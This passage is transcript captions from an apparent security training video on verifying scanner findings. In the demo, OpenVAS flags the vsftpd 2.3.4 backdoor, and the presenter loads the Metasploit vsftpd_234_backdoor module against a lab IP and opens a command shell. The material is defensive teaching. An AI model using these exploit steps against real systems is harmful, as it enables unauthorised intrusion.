for\n\n78\n00:03:25.208 --> 00:03:27.483\nyour scanner?\n&gt;&gt; [LAUGH] A scanner for your scanner?\n\n79\n00:03:27.483 --> 00:03:28.142\n&gt;&gt; [LAUGH]\n\n80\n00:03:28.142 --> 00:03:29.590\n&gt;&gt; Actually, they're typically built in to\n\n81\n00:03:29.590 --> 00:03:31.273\nsay, check for updates.\n&gt;&gt; Run it, right?\n\n82\n00:03:31.273 --> 00:03:31.959\n&gt;&gt; So you can do that.\n\n83\n00:03:31.959 --> 00:03:35.168\nYou can check for updates, or maybe they\nautomatically update themselves, once,\n\n84\n00:03:35.168 --> 00:03:37.080\ntwice, three times a day,\nwhatever the case is.\n\n85\n00:03:37.080 --> 00:03:41.029\nBut whatever it is, make sure before\nyou run your scans, that everything's\n\n86\n00:03:41.029 --> 00:03:44.695\nup-to-date, cuz this will alleviate\nfalse positives as a problem.\n\n87\n00:03:44.695 --> 00:03:50.962\nDoesn't completely remove it,\nbut it will help lower that down.\n\n88\n00:03:50.962 --> 00:03:52.108\nAll updates are done.\n\n89\n00:03:52.108 --> 00:03:57.022\nHave you ever called a tech support for\nany kind of software or system,\n\n90\n00:03:57.022 --> 00:04:01.619\nthe first thing they're gonna ask you is,\nwhat's the version?\n\n91\n00:04:01.619 --> 00:04:03.211\nWhat version are you running?\n\n92\n00:04:03.211 --> 00:04:03.985\nIs it up-to-date?\n\n93\n00:04:03.985 --> 00:04:05.044\nWhen's the last time you ran an update?\n\n94\n00:04:05.044 --> 00:04:06.714\nWell I ran an update three weeks ago.\n\n95\n00:04:06.714 --> 00:04:08.868\nWell an update came out to two days ago,\ndid you run that?\n\n96\n00:04:08.868 --> 00:04:09.444\nWell no.\n\n97\n00:04:09.444 --> 00:04:12.093\nRun that, and then call us back.\n&gt;&gt; Marathon.\n\n98\n00:04:12.093 --> 00:04:13.208\n&gt;&gt; I was working at Enterprise\n\n99\n00:04:13.208 --> 00:04:14.367\nenvironment.\n&gt;&gt; Mm-hm.\n\n100\n00:04:14.367 --> 00:04:16.159\n&gt;&gt; If you call tech support, and\n\n101\n00:04:16.159 --> 00:04:20.186\nyou are not on the latest version,\nthey will tell you, bye-bye.\n\n102\n00:04:20.186 --> 00:04:20.808\n&gt;&gt; Bye-bye.\n\n103\n00:04:20.808 --> 00:04:21.590\n&gt;&gt; Thanks for playing,\n\n104\n00:04:21.590 --> 00:04:23.204\ncall us back when that version's updated.\n\n105\n00:04:23.204 --> 00:04:27.554\nAnd it really burns you when you\nupdate the thing, and then it works,\n\n106\n00:04:27.554 --> 00:04:29.650\nyou're like.\n&gt;&gt; [LAUGH]\n\n107\n00:04:29.650 --> 00:04:30.184\n&gt;&gt; Then you have no one to\n\n108\n00:04:30.184 --> 00:04:30.788\nblame, but yourself.\n\n109\n00:04:30.788 --> 00:04:33.142\nBut that is the case.\n&gt;&gt; Yeah.\n\n110\n00:04:33.142 --> 00:04:33.701\n&gt;&gt; What else?\n\n111\n00:04:33.701 --> 00:04:37.211\nMaybe you had insufficient access,\nor authorization,\n\n112\n00:04:37.211 --> 00:04:41.744\nto accurately determine whether or\nnot that vulnerability is there, and\n\n113\n00:04:41.744 --> 00:04:44.757\nthe scanner was just\nguessing that it's there.\n\n114\n00:04:44.757 --> 00:04:48.747\nSo you weren't actually able to punch\nthrough and verify it with the scanner,\n\n115\n00:04:48.747 --> 00:04:50.511\nthe scanner wasn't able to do it.\n\n116\n00:04:50.511 --> 00:04:53.327\nBut it has a good indication\nthat might be a problem.\n\n117\n00:04:53.327 --> 00:04:55.576\nSo it flagged it, and\nit put it in your report.\n\n118\n00:04:55.576 --> 00:04:59.712\nWell now you've got to go verify, well,\nokay, yeah, but you'd have to be here, and\n\n119\n00:04:59.712 --> 00:05:01.705\nthen that, so it can't happen that way.\n\n120\n00:05:01.705 --> 00:05:04.608\nAnd you would verify that\nas a false positive, right?\n\n121\n00:05:04.608 --> 00:05:07.152\nLet's see here,\nwhat else do we need to do?\n\n122\n00:05:07.152 --> 00:05:10.769\nI think as far as false positives go,\n\n123\n00:05:10.769 --> 00:05:15.193\nthat might be all we need.\n&gt;&gt; So the transport verifying model-\n\n124\n00:05:15.193 --> 00:05:16.287\n&gt;&gt; [LAUGH] Yeah.\n\n125\n00:05:16.287 --> 00:05:17.545\n&gt;&gt; [LAUGH] Is very important,\n\n126\n00:05:17.545 --> 00:05:19.904\nhow do we verify?\n&gt;&gt; Yeah, that's a great question,\n\n127\n00:05:19.904 --> 00:05:21.436\nthere's multiple ways.\n&gt;&gt; Yeah.\n\n128\n00:05:21.436 --> 00:05:21.989\n&gt;&gt; We actually kind of\n\n129\n00:05:21.989 --> 00:05:22.721\ntouched on some of this.\n\n130\n00:05:22.721 --> 00:05:27.375\nI also wanna talk, really quickly, on one\nquestion that comes to mind, into a lot of\n\n131\n00:05:27.375 --> 00:05:31.982\npeople's minds, when you're talking\nabout verification of vulnerabilities.\n\n132\n00:05:31.982 --> 00:05:38.096\nWhy are we verifying vulnerabilities if\nwe've got the vulnerabilities scanner,\n\n133\n00:05:38.096 --> 00:05:38.715\nright?\n\n134\n00:05:38.715 --> 00:05:41.091\nWell the idea that false positives occur,\n\n135\n00:05:41.091 --> 00:05:44.000\nshould be one good answer\nto that question, right?\n\n136\n00:05:44.000 --> 00:05:44.551\nSo we must verify.\n\n137\n00:05:44.551 --> 00:05:47.242\nJust because the scanner\nhas given us answers,\n\n138\n00:05:47.242 --> 00:05:51.024\ndoesn't necessarily mean that\nthey're right answers, right?\n\n139\n00:05:51.024 --> 00:05:52.664\nSo we gotta do that verification.\n\n140\n00:05:52.664 --> 00:05:56.778\nThat's the reason that we perform\nthese assessments of whether or\n\n141\n00:05:56.778 --> 00:06:00.020\nnot the vulnerabilities are true or\nfalse, right?\n\n142\n00:06:00.020 --> 00:06:01.212\nSo we have to be doing that.\n\n143\n00:06:01.212 --> 00:06:06.189\nAnd it can also point you in\nthe right direction, that's what it's\n\n144\n00:06:06.189 --> 00:06:11.268\nmeant to do is kinda give you\na guideline of where something might be.\n\n145\n00:06:11.268 --> 00:06:15.776\nIt is our job, as security professionals,\nto make sure that we covered every base.\n\n146\n00:06:15.776 --> 00:06:18.581\n[LAUGH] Zach and I were having\na good time conversating about,\n\n147\n00:06:18.581 --> 00:06:21.464\nbefore the show, left no stone unturned.\n&gt;&gt; [LAUGH]\n\n148\n00:06:21.464 --> 00:06:23.152\n&gt;&gt; [LAUGH] He's laughing hard cuz-\n\n149\n00:06:23.152 --> 00:06:24.291\n&gt;&gt; There's a little private joke in there\n\n150\n00:06:24.291 --> 00:06:25.227\nsomewhere.\n&gt;&gt; Yeah.\n\n151\n00:06:25.227 --> 00:06:26.646\n&gt;&gt; We're not gonna go over that right now.\n\n152\n00:06:26.646 --> 00:06:28.459\n[LAUGH]\n&gt;&gt; We went down a real long road on\n\n153\n00:06:28.459 --> 00:06:29.790\nwhat that actually meant.\n\n154\n00:06:29.790 --> 00:06:31.485\nSo that's kind of funny,\nI got to use it in the show.\n\n155\n00:06:31.485 --> 00:06:32.626\n&gt;&gt; Good, there we go.\n\n156\n00:06:32.626 --> 00:06:33.412\n&gt;&gt; And there we go.\n\n157\n00:06:33.412 --> 00:06:37.039\nAnd don't forget that the scanner does\nget things right, a lot of the time.\n\n158\n00:06:37.039 --> 00:06:38.680\nSo there you go.\n\n159\n00:06:38.680 --> 00:06:42.749\nNow let's go back to Zach's topic,\nhow do we verify?\n\n160\n00:06:42.749 --> 00:06:45.196\nThis is super, super easy.\n\n161\n00:06:45.196 --> 00:06:50.198\nIf you open your scanner and\nit says, a vulnerability found,\n\n162\n00:06:50.198 --> 00:06:53.286\nwell, are you running that service?\n\n163\n00:06:53.286 --> 00:06:55.157\nYou basically run it down.\n\n164\n00:06:55.157 --> 00:06:58.567\nIf it says something like, patch missing.\n&gt;&gt; Mm-hm.\n\n165\n00:06:58.567 --> 00:06:59.678\n&gt;&gt; In Windows.\n\n166\n00:06:59.678 --> 00:07:03.344\nIn Windows, you can go into the,\nnot admin and preferences,\n\n167\n00:07:03.344 --> 00:07:06.955\nthis is what it used to be,\nnow it's Programs and Features.\n\n168\n00:07:06.955 --> 00:07:09.578\nYou go to Programs and\nFeatures, you go in Windows.\n\n169\n00:07:09.578 --> 00:07:12.206\nYou go into the update area\nof the Control Panel, and\n\n170\n00:07:12.206 --> 00:07:14.071\nthere is an installed updates area.\n\n171\n00:07:14.071 --> 00:07:17.744\nYou click on that, it tells you, here are\nthe updates that have been installed, and\n\n172\n00:07:17.744 --> 00:07:18.953\nwhen they were installed.\n\n173\n00:07:18.953 --> 00:07:23.598\nSo if you come back and your scanner says,\nmissing update, or patch,\n\n174\n00:07:23.598 --> 00:07:27.928\nsuch and such, for\na Windows operating system X,Y, whatever,\n\n175\n00:07:27.928 --> 00:07:30.468\nI can actually go in there and verify.\n\n176\n00:07:30.468 --> 00:07:34.960\nLook through my patch, do a filtered\nsearch, hey, it is actually there.\n\n177\n00:07:34.960 --> 00:07:38.440\nIt's right, that does not exist,\nand that's a bad, bad thing.\n\n178\n00:07:38.440 --> 00:07:42.192\nI need to hit the update button,\nand see if it comes in, and if not,\n\n179\n00:07:42.192 --> 00:07:45.350\nfigure out why that machine\nis not getting that update.\n\n180\n00:07:45.350 --> 00:07:51.358\nMaybe we've made an exclusion for whatever\nreason, X,Y, and Z, whatever the case is.\n\n181\n00:07:51.358 --> 00:07:54.104\nBut I need to verify that if that says,\nthat's what it is,\n\n182\n00:07:54.104 --> 00:07:55.854\nthat's exactly what's happened.\n\n183\n00:07:55.854 --> 00:07:57.814\nAnd these are the are the ways we do this,\n\n184\n00:07:57.814 --> 00:07:59.725\nwe just kind of run them down.\n&gt;&gt; Mm-hm.\n\n185\n00:07:59.725 --> 00:08:01.320\n&gt;&gt; To be honest with you.\n\n186\n00:08:01.320 --> 00:08:07.190\nIt's not that crazy, if it says possible\nSQL injection, guess what I'm gonna do?\n\n187\n00:08:07.190 --> 00:08:11.910\nI'm gonna open up the area in which it\nsaid there's a SQL injection possible.\n\n188\n00:08:11.910 --> 00:08:17.590\nAnd I'm gonna throw SQL injection queries\nat it and see if anything happens.\n\n189\n00:08:17.590 --> 00:08:22.190\nIf it does,\nI verify that that SQL injection is true.\n\n190\n00:08:22.190 --> 00:08:23.295\nI need to do something about that.\n\n191\n00:08:23.295 --> 00:08:27.501\nEven if I can't get it to work,\nthen as a security professional,\n\n192\n00:08:27.501 --> 00:08:30.700\nI should know how to do those things.\n\n193\n00:08:30.700 --> 00:08:35.560\nThen I've verified that\nthe scanner has told me the truth.\n\n194\n00:08:35.560 --> 00:08:39.460\nAnd now we need to do mitigation and\nremediation of that vulnerability.\n\n195\n00:08:40.530 --> 00:08:44.630\nLet's see here, I also like to tell you\nthis don't be afraid to get expert help.\n\n196\n00:08:44.630 --> 00:08:47.130\nI'm talking about hey,\nyou just throw some SQL injections out.\n\n197\n00:08:47.130 --> 00:08:49.435\nMaybe you're not the SQL king,\nI'm not the sequel king.\n\n198\n00:08:49.435 --> 00:08:52.620\n&gt;&gt; I am not the SQL king.\n\n199\n00:08:52.620 --> 00:08:54.130\n&gt;&gt; Full disclosure, Zack and\n\n200\n00:08:54.130 --> 00:08:56.360\nI are not the SQL kings.\n\n201\n00:08:56.360 --> 00:08:59.820\nBut I know people that are,\nI know people that are really good at.\n\n202\n00:08:59.820 --> 00:09:03.020\nAnd from what I know, all coupled with\nwhat they know, I could probably put\n\n203\n00:09:03.020 --> 00:09:07.740\ntogether a really good SQL injection\nstring that might gain some traction.\n\n204\n00:09:07.740 --> 00:09:09.980\nUse cheats, outsource this stuff, right?\n\n205\n00:09:09.980 --> 00:09:13.950\nDon't be afraid to use colleagues,\ncontacts, outsource\n\n206\n00:09:13.950 --> 00:09:17.670\neverything you can to try to throw\neverything you can to verify these things.\n\n207\n00:09:17.670 --> 00:09:21.740\nIf it's outside of your expertise\nwheelhouse as it were, okay?\n\n208\n00:09:21.740 --> 00:09:25.080\nLet's see here, let's do a demo.\n\n209\n00:09:25.080 --> 00:09:27.320\nLet's take a look at what this\nmight actually look like.\n\n210\n00:09:27.320 --> 00:09:28.953\nHow does that sound?\n&gt;&gt; Sounds good.\n\n211\n00:09:28.953 --> 00:09:31.055\n&gt;&gt; All right, let's jump over to,\n\n212\n00:09:31.055 --> 00:09:32.563\nwhere's my Kali here?\n\n213\n00:09:32.563 --> 00:09:37.120\nHere we go and what do I wanna do?\n\n214\n00:09:37.120 --> 00:09:39.383\nLet's open OpenVAS, so\n\n215\n00:09:39.383 --> 00:09:42.160\nI'll say openvas-start.\n&gt;&gt; I like\n\n216\n00:09:42.160 --> 00:09:42.818\nOpenVAS.\n&gt;&gt; Yes,\n\n217\n00:09:42.818 --> 00:09:45.106\nOpenVAS is a wonderful little\ntool that we have going.\n\n218\n00:09:45.106 --> 00:09:47.001\nIt's been such a handy item for us.\n\n219\n00:09:47.001 --> 00:09:50.822\nRemember we ran a scan\nin a previous episode?\n\n220\n00:09:50.822 --> 00:09:57.090\nI say what we do we'll go into that scan,\nlook at the results, pick one.\n\n221\n00:09:57.090 --> 00:10:01.370\nAnd verify whether or\nnot it actually is a problem or not.\n\n222\n00:10:01.370 --> 00:10:04.500\nGive us a second here and\nthe webpage is gonna be fun.\n\n223\n00:10:04.500 --> 00:10:07.490\nAnd look at that I love automatic things,\nhere we go, automatic is nice.\n\n224\n00:10:07.490 --> 00:10:09.785\nHere we go, all right so\nlet's do the whole login procedure.\n\n225\n00:10:13.886 --> 00:10:18.483\nLooking good, looking good, here we go.\n&gt;&gt; [LAUGH]\n\n226\n00:10:18.483 --> 00:10:19.373\n&gt;&gt; Here we go, sometimes you just gotta\n\n227\n00:10:19.373 --> 00:10:20.450\nyell at it a little harder.\n\n228\n00:10:20.450 --> 00:10:22.390\nCome on there buddy I know you can.\n\n229\n00:10:22.390 --> 00:10:24.762\nI'm running a VM, so\nI can't really complain about this thing.\n\n230\n00:10:24.762 --> 00:10:26.350\n&gt;&gt; No, it's fine.\n\n231\n00:10:26.350 --> 00:10:30.410\n&gt;&gt; All right, let's go into our reports.\n\n232\n00:10:31.970 --> 00:10:37.550\nCuz I know I have a report for\nthat there we go.\n\n233\n00:10:37.550 --> 00:10:40.347\nI know there's gonna have something in\nthere that we can track down whether or\n\n234\n00:10:40.347 --> 00:10:41.260\nnot it's true or false.\n\n235\n00:10:41.260 --> 00:10:42.501\nProbably true, it'll be fun though.\n\n236\n00:10:42.501 --> 00:10:46.065\nLet's see here, here we go,\n\n237\n00:10:46.065 --> 00:10:54.104\nvsftpd Compromised Source\nPackage Backdoor Vulnerability.\n\n238\n00:10:54.104 --> 00:10:59.380\nSounds nasty, let's click it, here we go.\n\n239\n00:10:59.380 --> 00:11:02.680\nSo this tells me it's prone\nto a backdoor vulnerability.\n\n240\n00:11:02.680 --> 00:11:05.360\nA vulnerability was detected according to\nthe Vulnerability Detection Method that\n\n241\n00:11:05.360 --> 00:11:07.490\nwe used, which was the OpenVAS scan.\n\n242\n00:11:07.490 --> 00:11:10.910\nImpact, attackers can\nexploit this issue to execute\n\n243\n00:11:10.910 --> 00:11:13.600\narbitrary commands in\nthe context of the application.\n\n244\n00:11:13.600 --> 00:11:17.550\nSuccesful attacks will compromise\nthe affected application, that sounds bad.\n\n245\n00:11:17.550 --> 00:11:24.218\nThere is a fix if we do find\nthis to be verified as true.\n\n246\n00:11:24.218 --> 00:11:28.853\nSo there's a vendor fix which means we\njust download the latest and greatest.\n\n247\n00:11:28.853 --> 00:11:31.306\nWe update the thing so\nwe don't call vsftpd.\n\n248\n00:11:31.306 --> 00:11:34.850\nAnd go hey, it looks like\npeople are just logging in and\n\n249\n00:11:34.850 --> 00:11:36.941\ndoing crazy stuff on my server.\n\n250\n00:11:36.941 --> 00:11:39.243\nHey, did you update?\n&gt;&gt; Did you update that, sir?\n\n251\n00:11:39.243 --> 00:11:40.640\n&gt;&gt; Yeah, yeah did you update that?\n\n252\n00:11:40.640 --> 00:11:45.847\nSo there we go, it tells us exactly\nwhich package was affected 2.3.4.\n\n253\n00:11:45.847 --> 00:11:48.990\nAnd then the vulnerability\ndetection method.\n\n254\n00:11:48.990 --> 00:11:54.969\nSo, that being the case,\nI do wanna look this up, it's cool.\n\n255\n00:11:54.969 --> 00:11:58.147\n[COUGH] Let me scroll\nout here really quickly,\n\n256\n00:11:58.147 --> 00:12:03.670\nI'm gonna move this over here out of\nthe way so we can easily move here.\n\n257\n00:12:03.670 --> 00:12:05.870\nAnd where is Chrome?\n\n258\n00:12:07.710 --> 00:12:12.760\nI think I need a new window, there we go.\n\n259\n00:12:12.760 --> 00:12:16.092\nAnd we will do this,\nI looked this up earlier.\n\n260\n00:12:16.092 --> 00:12:17.143\nIt's\n\n261\n00:12:17.143 --> 00:12:28.075\nhttp://www.securityfocus.com/bid/48539,\n\n262\n00:12:28.075 --> 00:12:31.650\n4853 to the 9.\n\n263\n00:12:31.650 --> 00:12:37.458\nAnd this is basically the nuts and\nbolts behind this attack.\n\n264\n00:12:37.458 --> 00:12:41.800\nAnd we're just waiting for\nsecurity focus to come back, there we go.\n\n265\n00:12:41.800 --> 00:12:45.375\nAnd we're kinda getting some of the same\ninformation that we got from OpenVAS\n\n266\n00:12:45.375 --> 00:12:45.990\nabout this.\n\n267\n00:12:45.990 --> 00:12:47.164\nBut it has this lovely exploit tab.\n\n268\n00:12:47.164 --> 00:12:56.110\nAnd it says attacker can use readily\navailable tools to exploit this issue.\n\n269\n00:12:56.110 --> 00:12:57.870\nAnd the following exploit is available.\n\n270\n00:12:57.870 --> 00:13:02.530\nOoh, excellent,\nclick on that link and there it is.\n\n271\n00:13:02.530 --> 00:13:04.820\nAnd this file is part of\nthe Metasploit framework.\n\n272\n00:13:04.820 --> 00:13:07.298\nOkay, excellent,\nthat means I can use Metasploit.\n\n273\n00:13:07.298 --> 00:13:12.210\nThere's a plug-in for Metasploit that\nshould be able to successfully, if we're\n\n274\n00:13:12.210 --> 00:13:14.670\nvulnerable, exploit this vulnerability.\n&gt;&gt; So\n\n275\n00:13:14.670 --> 00:13:18.045\ndoes Metasploit play nice with OpenVAS?\n&gt;&gt; Yeah, OpenVAS is just a scanner.\n\n276\n00:13:18.045 --> 00:13:22.324\nMetasploit is an exploit framework that\nallows us to test the vulnerabilities that\n\n277\n00:13:22.324 --> 00:13:24.970\nOpenVAS tells us about.\n&gt;&gt; Very cool.\n\n278\n00:13:24.970 --> 00:13:26.210\n&gt;&gt; It also can do some scanning of its\n\n279\n00:13:26.210 --> 00:13:27.140\nown, to be honest with you.\n\n280\n00:13:27.140 --> 00:13:30.760\nSo a very robust tool in\nthe security toolkit.\n\n281\n00:13:30.760 --> 00:13:35.696\nSo let's do that let's jump\ninto good old Metasploit.\n\n282\n00:13:35.696 --> 00:13:41.769\nRight here, station one,\nlet's clear it out and nsfconsole,\n\n283\n00:13:41.769 --> 00:13:47.990\nrun that And just waiting, here we go.\n\n284\n00:13:47.990 --> 00:13:49.978\nStarting the Metasploit, probably\ngonna have to talk sweet to it too.\n\n285\n00:13:49.978 --> 00:13:51.115\n&gt;&gt; [LAUGH]\n\n286\n00:13:51.115 --> 00:13:52.496\n&gt;&gt; Come on, Metasploit,\n\n287\n00:13:52.496 --> 00:13:55.302\nyou're such a good little framework.\n&gt;&gt; Let's sing it a song.\n\n288\n00:13:55.302 --> 00:13:57.751\n[MUSIC]\n\n289\n00:13:57.751 --> 00:13:59.165\n&gt;&gt; Look it worked.\n\n290\n00:13:59.165 --> 00:14:00.290\n[LAUGH] Good job, Zach.\n\n291\n00:14:00.290 --> 00:14:00.873\n&gt;&gt; Perfect.\n&gt;&gt; There we go.\n\n292\n00:14:00.873 --> 00:14:03.110\n[LAUGH] I love shells good old Egypt.\n\n293\n00:14:03.110 --> 00:14:05.660\nHe knows what he's talking about that guy.\n&gt;&gt; [LAUGH]\n\n294\n00:14:05.660 --> 00:14:07.700\n&gt;&gt; [COUGH] Let's see here, so\n\n295\n00:14:07.700 --> 00:14:12.348\nwhat we need to do is search for\nthat vsftpd vulnerability.\n\n296\n00:14:12.348 --> 00:14:14.870\nI can't remember off the top\nof my head what it was.\n\n297\n00:14:14.870 --> 00:14:19.154\nMaybe this will tell me, yeah version 2.2,\nwe'll just look for vsftpd.\n\n298\n00:14:19.154 --> 00:14:20.760\n&gt;&gt; Can you do a copy paste?\n\n299\n00:14:20.760 --> 00:14:22.036\n&gt;&gt; Search, I probably could.\n\n300\n00:14:22.036 --> 00:14:23.806\nVsftpd, there we go,\n\n301\n00:14:23.806 --> 00:14:29.600\nI'm gonna use the slow search cuz I\nhaven't done the cache database yet.\n\n302\n00:14:29.600 --> 00:14:31.900\nWhat are you gonna do?\n\n303\n00:14:31.900 --> 00:14:32.773\nIt'll take a second.\n&gt;&gt; Just do a slow search.\n\n304\n00:14:32.773 --> 00:14:34.440\n&gt;&gt; And it's doesn't take too long.\n\n305\n00:14:34.440 --> 00:14:39.210\nIt's just slower than instantaneous, so\nthat's just gonna take but a second.\n\n306\n00:14:39.210 --> 00:14:41.860\nI think, yeah, there we go and we're done.\n\n307\n00:14:41.860 --> 00:14:45.390\nAnd there's the exploit right here.\n\n308\n00:14:45.390 --> 00:14:52.860\nThis is the actual module,\nthis exploit/unix/ftp/vsftpd 234 backdoor.\n\n309\n00:14:52.860 --> 00:14:57.959\nSo what I can do is I can copy that,\nI don't think I need that character.\n\n310\n00:14:57.959 --> 00:15:01.937\nThe white space, there we go,\nI'm gonna copy that, copy.\n\n311\n00:15:01.937 --> 00:15:08.100\nAnd I'm gonna say use that.\n\n312\n00:15:08.100 --> 00:15:11.890\nAnd now we've loaded that\nmodule up into Metasploit.\n\n313\n00:15:11.890 --> 00:15:19.050\nAll right, now that we've seen that it's\nthere, I think we need to set a host.\n\n314\n00:15:19.050 --> 00:15:20.400\nWe have to tell it who to attack.\n\n315\n00:15:20.400 --> 00:15:23.509\nSo we say, set, remote host,\n\n316\n00:15:23.509 --> 00:15:28.208\nand that is 192.168.55.145.\n\n317\n00:15:28.208 --> 00:15:31.090\nThere we go, the remote host has been set.\n\n318\n00:15:31.090 --> 00:15:33.490\nAnd I believe all you\ndo now is hit exploit.\n\n319\n00:15:34.980 --> 00:15:38.570\nAnd now, it's gonna run some magic,\nthings are happening.\n\n320\n00:15:38.570 --> 00:15:43.620\nI see, the backdoor service has been\nspawned, command shell 1 opened.\n\n321\n00:15:43.620 --> 00:15:46.820\nSo if I do ls al, hey,\nlook at that, I'm in the machine.\n\n322\n00:15:46.820 --> 00:15:51.782\nI have successfully verified that\nthe vulnerability that the OpenVAS\n\n323\n00:15:51.782 --> 00:15:54.222\nscanner has found was true.\n&gt;&gt; Awesome.\n\n324\n00:15:54.222 --> 00:15:55.132\n&gt;&gt; It does work and\n\n325\n00:15:55.132 --> 00:15:59.892\nnow I need to follow the mitigation steps\nthat was Suggested to me by OpenVas which\n\n326\n00:15:59.892 --> 00:16:02.204\nis do a vendor upgrade or that service.\n\n327\n00:16:02.204 --> 00:16:06.413\nSo that's basically me verifying whether\nor not that stuff actually worked, and\n\n328\n00:16:06.413 --> 00:16:09.260\nit did, so now we know what to do.\n&gt;&gt; Trust, but\n\n329\n00:16:09.260 --> 00:16:11.160\nverify.\n&gt;&gt; Yes.\n\n330\n00:16:11.160 --> 00:16:13.880\nNow the only thing we have to\ndo after that is sometimes,\n\n331\n00:16:13.880 --> 00:16:19.940\nthis is an interesting thing,\nsometimes we have exceptions to the rule.\n\n332\n00:16:19.940 --> 00:16:26.082\nYes I know I'm running VSTP Version 2.3.4,\nbut I have to.\n\n333\n00:16:26.082 --> 00:16:27.524\nWhat?\n\n334\n00:16:27.524 --> 00:16:28.175\nWhy?\n&gt;&gt; [LAUGH]\n\n335\n00:16:28.175 --> 00:16:30.464\n&gt;&gt; But it's completely wide open\n\n336\n00:16:30.464 --> 00:16:31.350\nto attack.\n\n337\n00:16:31.350 --> 00:16:33.410\nI know it's horrible, right?\n\n338\n00:16:33.410 --> 00:16:34.360\nBut I've got no choice.\n\n339\n00:16:34.360 --> 00:16:39.590\nYou'll see this a lot of times\ninside of closed or air gap systems,\n\n340\n00:16:39.590 --> 00:16:46.070\nthings like ICS, the control systems for,\nor large things like\n\n341\n00:16:46.070 --> 00:16:50.445\nwater and power, electricity,\nthose types of devices, right?\n\n342\n00:16:52.110 --> 00:16:58.300\nI think I told the story before, I was\nat RSA, guy had a heart monitor scanner,\n\n343\n00:16:58.300 --> 00:17:01.120\nhas a embedded version of Linux\nrunning operating system for\n\n344\n00:17:01.120 --> 00:17:02.970\nthe heart monitor, and not update.\n\n345\n00:17:02.970 --> 00:17:05.349\nI have to exclude that from my scan.\n\n346\n00:17:05.349 --> 00:17:08.910\nCould we get this, If I scan all of\nthe network hosts on my system and\n\n347\n00:17:08.910 --> 00:17:12.650\nthe heart monitor which is connected to my\nnetwork, is gonna get scanned and is going\n\n348\n00:17:12.650 --> 00:17:18.690\nto find out that it's running an old\nversion of Linux that needs to be updated.\n\n349\n00:17:18.690 --> 00:17:21.820\nBut I know that,\nI know that for a fact, and\n\n350\n00:17:21.820 --> 00:17:23.910\nthere's not a single\nthing I can do about it.\n\n351\n00:17:23.910 --> 00:17:26.860\nI need the heart monitor\nmore than I need to update\n\n352\n00:17:26.860 --> 00:17:29.340\nthe thing to turn it into a brick.\n&gt;&gt; Goodness gracious.\n\n353\n00:17:29.340 --> 00:17:30.020\n&gt;&gt; I need the heart monitor to\n\n354\n00:17:30.020 --> 00:17:31.400\nwork, right?\n\n355\n00:17:31.400 --> 00:17:33.070\nSo I'll make an exception.\n\n356\n00:17:34.180 --> 00:17:37.400\nI will remove that from\nthe scope of my scan.\n\n357\n00:17:37.400 --> 00:17:40.470\nBecause I have these known devices,\nthat I know\n\n358\n00:17:40.470 --> 00:17:46.020\nI'm going to live with the risk that comes\nassociated with having them on my network.\n\n359\n00:17:46.020 --> 00:17:48.880\nBecause I need the device more than\n\n360\n00:17:48.880 --> 00:17:50.460\nI don't need the risk\nof having it exploited.\n\n361\n00:17:50.460 --> 00:17:52.620\nWhile that does seem a very,\n\n362\n00:17:52.620 --> 00:17:56.159\nvery scary thing when it comes\nto heart monitors [LAUGH].\n\n363\n00:17:56.159 --> 00:17:58.780\nCuz then Zach could be standing\nover you with a pillow, and\n\n364\n00:17:58.780 --> 00:18:01.400\nthe whole time your heart monitor's\ntelling the nurse that you're\n\n365\n00:18:01.400 --> 00:18:02.180\nfine.\n&gt;&gt; [LAUGH]\n\n366\n00:18:02.180 --> 00:18:04.250\n&gt;&gt; Yeah, that's not good.\n\n367\n00:18:04.250 --> 00:18:05.310\n&gt;&gt; I'm trained in CPR,\n\n368\n00:18:05.310 --> 00:18:07.305\nI'll have you know.\n&gt;&gt; Reverse CPR.\n\n369\n00:18:07.305 --> 00:18:09.629\n[LAUGH]\n&gt;&gt; Yeah, we're gonna go get one.\n\n370\n00:18:09.629 --> 00:18:11.040\n&gt;&gt; He stops the hearts from beating.\n\n371\n00:18:11.040 --> 00:18:12.306\nHe's a killer and no one likes him.\n\n372\n00:18:12.306 --> 00:18:13.196\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n373\n00:18:13.196 --> 00:18:14.750\n&gt;&gt; But that could happen, right?\n\n374\n00:18:14.750 --> 00:18:18.659\nSo what do we do,\nwe implement compensating controls.\n\n375\n00:18:20.200 --> 00:18:22.930\nWell, we find ways around\nthat as a problem.\n\n376\n00:18:22.930 --> 00:18:26.510\nBut I have to exclude\nthat device from my scan,\n\n377\n00:18:26.510 --> 00:18:28.580\notherwise it's gonna clutter up my scan.\n\n378\n00:18:28.580 --> 00:18:30.120\nI know that that's vulnerable.\n\n379\n00:18:30.120 --> 00:18:31.640\nI don't need you to tell me.\n\n380\n00:18:31.640 --> 00:18:36.030\nI need to basically pare my\nscans down as much as possible\n\n381\n00:18:36.030 --> 00:18:38.520\nto just the news I can use.\n\n382\n00:18:38.520 --> 00:18:40.300\nAnd if I notice something is vulnerable,\nand\n\n383\n00:18:40.300 --> 00:18:43.960\nI've accepted that risk, then I don't\nneed to have this as part of my scan.\n\n384\n00:18:43.960 --> 00:18:48.600\nSo I'd go in, I would change the scope and\nremove that device from the scope so\n\n385\n00:18:48.600 --> 00:18:50.390\nthat it would not report back, or\n\n386\n00:18:50.390 --> 00:18:54.380\nI would remove that vulnerability\nfrom the scope of the scan.\n\n387\n00:18:54.380 --> 00:18:58.140\nI would have to create a custom scan for\ndevices like that.\n\n388\n00:18:58.140 --> 00:19:01.215\nSo these are things that we will have\nto do when it comes to exceptions.\n\n389\n00:19:01.215 --> 00:19:02.430\n&gt;&gt; Mm-hm.\n\n390\n00:19:02.430 --> 00:19:03.485\n&gt;&gt; Make sure you record that,\n\n391\n00:19:03.485 --> 00:19:06.260\nthat you're making a record.\n&gt;&gt; Yeah.\n\n392\n00:19:06.260 --> 00:19:09.610\n&gt;&gt; Of I have made an exception to this.\n\n393\n00:19:09.610 --> 00:19:12.710\nAnd that went through proper change\nmanagement and it has been approved that\n\n394\n00:19:12.710 --> 00:19:16.510\nwe're making an exception to this\nbecause of the necessity of the device.\n\n395\n00:19:16.510 --> 00:19:23.705\nAnother thing, I've seen, I've heard of\ndevices still running Windows NT 4.0,\n\n396\n00:19:23.705 --> 00:19:27.304\nand that came out in the late 90s.\n&gt;&gt; Goodness gracious.\n\n397\n00:19:27.304 --> 00:19:28.215\n&gt;&gt; To this day, and\n\n398\n00:19:28.215 --> 00:19:31.742\nit's running critical infrastructure,\nto this day, right?\n\n399\n00:19:31.742 --> 00:19:34.119\nBut they can't stop it\nbecause if you turn it off,\n\n400\n00:19:34.119 --> 00:19:36.000\nthen people don't get 